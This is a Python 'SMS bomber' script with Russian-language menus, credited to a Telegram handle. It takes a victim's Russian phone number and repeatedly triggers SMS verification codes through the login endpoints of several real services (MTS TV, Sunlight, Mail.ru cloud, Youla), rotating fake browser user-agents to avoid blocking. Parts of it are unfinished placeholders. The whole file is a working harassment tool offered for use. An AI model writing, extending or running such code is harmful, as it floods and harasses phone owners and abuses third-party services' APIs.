from time import sleep
import requests, fake_useragent
import random
import re
banner ='''
 ____                        __                      
/\  _`\                     /\ \                     
\ \ \L\ \    ___     ___ ___\ \ \____     __   _ __  
 \ \  _ <'  / __`\ /' __` __`\ \ '__`\  /'__`\/\`'__
  \ \ \L\ \/\ \L\ \/\ \/\ \/\ \ \ \L\ \/\  __/\ \ \/ 
   \ \____/\ \____/\ \_\ \_\ \_\ \_,__/\ \____ \_\ 
    \/___/  \/___/  \/_/\/_/\/_/\/___/  \/____/ \/_/ 
'''



heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
        'Accept': '*/*'
    },
]
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'
print(banner)
print(f"{green}{bold}\t\t{underline}[SMS BOMBER V 1.0]{end}")
print()
print(f"{bold}Написанно{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{green}{bold}TT|@zozick_bs{end}")

print(f"{bold}Telegram{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{green}{bold}@Zozick_bs{end}")
print('Installing...')
sleep(3)
print("\n" * 100)
def dev1():
    print("""
Введите режим работы:
[1] - Термукс
[2] - Виндовс
[3] - Линукс
    """)
    mode = input()
    if mode == '1':
        def menu1():

            print("""
Введите режим работы:
[1] - Спамер
[2] - Обновить
[3] - Выход
            """)
            menu = input()
            if menu == '1':
                print("""
Введите режим работы:
[1] - Смс
[2] - Звонки
                        """)
                reg1 = input()
                if reg1 == '1':
                    HEADERS = random.choice(heads)
                    user = fake_useragent.UserAgent().random
                    headers = {'user_agent' : user}
                    NUMBER = input('Введите номер телефона без "+7"')
                    number_7 = str(7) + str(NUMBER)
                    number_plus7 = str(+7) + str(NUMBER)
                    number_8 = str(8) + str(NUMBER)

                    try:
                        mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
                        print('Отправка прошла успешно')
                    except:
                        print('Сообщение не отправленно')
                    try:
                        requests.post('https://api.sunlight.net/v3/customers/authorization/',data={'phone': number_7})
                    except:
                        print('Отправка прошла успешно')
                    try:
                        requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": number_plus7, "api": 2, "email": "email", "x-email": "x-email"}, headers=HEADERS)
                        print("Отправка прошла успешно")

                    except:
                        print("Сообщение не отправленно")
                    pass
                    try:
                        requests.post('https://youla.ru/web-api/auth/request_code', json={"phone": number_plus7}, headers=HEADERS)

                        print("Отправка прошла успешно")

                    except:
                        print("Сообщение не отправленно")


                if reg1 == '2':
                    print('g')


            if menu == '2':
                print('Обновлений не найдено это последняя версия!')
                sleep(3)
                menu1()
            if menu == '3':
                print('Спасибо, что выбрали нас!')
                sleep(3)
                end

        menu1()

















    if mode == '2':
        print('f')

















    if mode == '3':
        print('Режим в разработке!')
        sleep(3)
        dev1()
dev1()
